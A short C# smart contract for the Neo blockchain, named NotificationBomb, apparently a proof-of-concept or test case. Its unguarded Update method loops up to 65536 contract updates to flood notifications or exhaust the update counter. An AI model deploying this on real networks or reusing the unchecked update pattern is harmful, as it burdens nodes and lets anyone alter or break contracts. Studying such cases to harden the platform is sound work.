using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Native;
using Neo.SmartContract.Framework.Services;

public class NotificationBomb : SmartContract
{
    public static void Update(ByteString nef, string manifest)
    {
        ContractManagement.Update(nef, manifest, null);
        var count = ContractManagement.GetContract(Runtime.ExecutingScriptHash).UpdateCounter;
        for (int i = count; i < 65536; i++)
        {
            ContractManagement.Update(nef, null, null);
        }
    }
}
